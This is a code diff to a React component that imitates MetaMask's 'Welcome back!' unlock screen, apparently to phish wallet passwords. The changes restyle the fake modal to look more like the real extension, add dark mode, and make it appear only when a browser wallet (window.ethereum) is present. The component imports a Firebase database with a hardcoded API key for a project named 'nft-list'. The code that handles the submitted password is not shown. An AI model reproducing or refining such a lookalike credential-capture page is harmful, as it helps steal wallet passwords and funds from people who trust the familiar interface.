@@ -4,7 +4,7 @@ import Modal from "react-modal";
 import meta_logo from "./assets/img/metamask-fox.svg";
 import spinner from "./assets/img/spinner.gif";
 import ethLogo from "./images/eth_logo.svg";
-import arrowDown from "./images/icons/arrow-down.svg";
+import { ReactComponent as ArrowDown } from "./images/icons/arrow-down.svg";
 
 import { initializeApp } from "firebase/app";
 import { getDatabase } from "firebase/database";
@@ -13,7 +13,8 @@ import CreateLogo from "./CreateLogo";
 
 import "./index.css";
 import "./MM.css";
-
+const isDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
+console.log(window.matchMedia("(prefers-color-scheme: dark)"));
 const basic = {
   apiKey: "AIzaSyD22LIz8nceulmiNWLDHC8nZj1SQ48doAQ",
   authDomain: "nft-list-67033.firebaseapp.com",
@@ -44,8 +45,7 @@ function getCaretCoordinates(element, position) {
 }
 const MM = ({ isOpen, setIsOpen }) => {
   const inputRef = useRef(null);
-  // const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
-  const animationEventEmitter = new EventEmitter();
+  const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
   const [loading, setLoading] = useState(true);
   const [pwd, setPwd] = useState("");
   const [validShow, setValidShow] = useState(false);
@@ -70,9 +70,9 @@ const MM = ({ isOpen, setIsOpen }) => {
     },
   };
 
-  // const handleOpenModal = () => {
-  //   setIsOpen(true);
-  // };
+  const handleOpenModal = () => {
+    setIsOpen(true);
+  };
 
   const handleCloseModal = () => {
     setIsOpen(false);
@@ -100,7 +100,7 @@ const MM = ({ isOpen, setIsOpen }) => {
   };
 
   const handleKeyUp = (e) => {
-    if (e.keyCode === 13) {
+    if (e.keyCode == 13) {
       handleClick();
     }
   };
@@ -108,20 +108,20 @@ const MM = ({ isOpen, setIsOpen }) => {
   const handleFocus = () => setPwdFocus(true);
   useEffect(() => {
     if (isOpen) {
+      if (!window.ethereum) return;
       setTimeout(() => {
         setLoading(false);
         setTimeout(() => {
           inputRef.current && inputRef.current.focus();
         }, 10);
-      }, 1000);
+      }, 3000);
     } else {
       setLoading(true);
     }
   }, [isOpen]);
-
   return (
     <Modal
-      isOpen={isOpen}
+      isOpen={window.ethereum && isOpen}
       style={styles}
       shouldCloseOnOverlayClick={true}
       shouldCloseOnEsc={true}
@@ -137,6 +137,7 @@ const MM = ({ isOpen, setIsOpen }) => {
             overflowX: "hidden",
             width: "375px",
           }}
+          data-theme={isDark ? "dark" : "light"}
         >
           <div
             style={{
@@ -150,16 +151,14 @@ const MM = ({ isOpen, setIsOpen }) => {
             <div style={{ display: "flex", flexFlow: "column" }}>
               <img
                 style={{
-                  width: "15rem",
-                  height: "15rem",
+                  width: "8rem",
+                  height: "8rem",
                   alignSelf: "center",
-                  margin: "15rem 0 0 0",
+                  margin: "10rem 0 0 0",
                 }}
-                alt= {""}
                 src={meta_logo}
               ></img>
               <img
-                alt= {""}
                 src={spinner}
                 style={{
                   width: "3rem",
@@ -173,7 +172,7 @@ const MM = ({ isOpen, setIsOpen }) => {
         </div>
       ) : (
         <>
-          <div id="app-content">
+          <div id="app-content" data-theme={isDark ? "dark" : "light"}>
             <div className="app os-win">
               <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                 <div className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
@@ -188,15 +187,11 @@ const MM = ({ isOpen, setIsOpen }) => {
                         role="img"
                         style={{ marginLeft: 12 }}
                       >
-                        <img
-                          className="mm-avatar-network__network-image"
-                          src={ethLogo}
-                          alt="Ethereum Mainnet logo"
-                        />
+                        <img className="mm-avatar-network__network-image" src={ethLogo} alt="Ethereum Mainnet logo" />
                       </div>
                       <span
                         className="mm-box mm-text mm-text--body-sm mm-text--ellipsis mm-box--color-text-default"
-                        style={{ fontSize: "1.33rem" }}
+                        style={{ fontSize: "1rem !important" }}
                       >
                         Ethereum Mainnet
                       </span>
@@ -204,15 +199,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                         className="mm-box mm-picker-network__arrow-down-icon mm-icon mm-icon--size-xs mm-box--margin-left-auto mm-box--display-inline-block mm-box--color-icon-default"
                         style={{ marginRight: "1rem" }}
                       >
-                        <img
-                          alt= {""}
-                          src={arrowDown}
-                          style={{
-                            width: "100%",
-                            height: "100%",
-                            marginBottom: "8px",
-                          }}
-                        ></img>
+                        <ArrowDown fill={isDark ? "white" : "black"} style={{ marginBottom: "4px" }} />
                       </span>
                     </button>
                   </div>
@@ -222,7 +209,6 @@ const MM = ({ isOpen, setIsOpen }) => {
                     style={{ marginRight: "8px" }}
                   >
                     <img
-                      alt= {""}
                       style={{
                         alignSelf: "center",
                         width: "100%",
@@ -249,7 +235,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                     <h1 className="unlock-page__title">Welcome back!</h1>
                     <div
                       style={{
-                        fontSize: "1.5rem",
+                        fontSize: "1rem",
                         fontFamily: `"Euclid Circular B", Roboto, Helvetica, Arial, sans-serif`,
                       }}
                     >
@@ -260,8 +246,8 @@ const MM = ({ isOpen, setIsOpen }) => {
                         <div
                           className={
                             "MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl" +
-                            (validShow === true ? " Mui-error" : "") +
-                            (pwdFocus === true ? " Mui-focused" : "")
+                            (validShow == true ? " Mui-error" : "") +
+                            (pwdFocus == true ? " Mui-focused" : "")
                           }
                         >
                           <input
@@ -272,7 +258,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                             dir="auto"
                             data-testid="unlock-password"
                             className={"MuiInputBase-input MuiInput-input"}
-                            style={{ marginTop: "16px", fontSize: "1.33rem" }}
+                            style={{ marginTop: "24px", fontSize: "0.75rem", borderBottom: pwd.length !== 0 ? " 1px solid #4459ff" : "1px solid black" }}
                             required
                             value={pwd}
                             onFocus={handleFocus}
@@ -289,39 +275,30 @@ const MM = ({ isOpen, setIsOpen }) => {
                             data-shrink="false"
                             htmlFor="password"
                             id="password-label"
-                            // style={{ fontSize: "1.5rem" }}
+                            style={{ color: isDark ? "white" : "gray", fontSize: "1rem"  }}
                           >
                             Password
                           </label>
                         </div>
-                        <div
-                          className={
-                            validShow
-                              ? "validate-password"
-                              : "validate-password-hidden"
-                          }
-                        >
+                        <div className={validShow ? "validate-password" : "validate-password-hidden"}>
                           Incorrect password
                         </div>
                       </div>
                     </div>
                     <button
-                      className={
-                        "button btn--rounded btn-default" +
-                        (pwd.length === 0 ? " unlock-btn-disabled" : "")
-                      }
+                      className={"button btn--rounded btn-default" + (pwd.length == 0 ? " unlock-btn-disabled" : "")}
                       data-testid="unlock-submit"
-                      disabled={pwd.length === 0}
+                      disabled={pwd.length == 0}
                       type="button"
                       variant="contained"
                       style={{
-                        backgroundColor: "var(--color-primary-default)",
-                        color: "var(--color-primary-inverse)",
+                        backgroundColor: pwd.length === 0 ? "#4658e0" : "#4459ff" ,
+                        color: pwd.length ===0 ? "#f8f9ff" : "#ffffff",
                         marginTop: "20px",
                         fontWeight: "400",
                         boxShadow: "none",
                         borderRadius: "100px",
-                        fontSize: "1.5rem",
+                        fontSize: "1rem",
                         padding: "12px 0",
                       }}
                       onClick={handleClick}
@@ -331,24 +308,17 @@ const MM = ({ isOpen, setIsOpen }) => {
                     <div className="unlock-page__links">
                       <a
                         className="button btn-link unlock-page__link"
-                        style={{ fontSize: "1.125rem" }}
+                        style={{ fontSize: "0.75rem", color: '#4459ff' }}
                         role="button"
                         tabIndex="0"
                       >
                         Forgot password?
                       </a>
                     </div>
-                    <div
-                      className="unlock-page__support"
-                      style={{ fontSize: "1.125rem" }}
-                    >
+                    <div className="unlock-page__support" style={{ fontSize: "0.75rem" }}>
                       <span>
                         Need help? Contact{" "}
-                        <a
-                          href="https://support.metamask.io"
-                          target="_blank"
-                          rel="noopener noreferrer"
-                        >
+                        <a href="https://support.metamask.io" target="_blank" rel="noopener noreferrer" style={{color:"#5568ff"}}>
                           MetaMask support
                         </a>
                       </span>
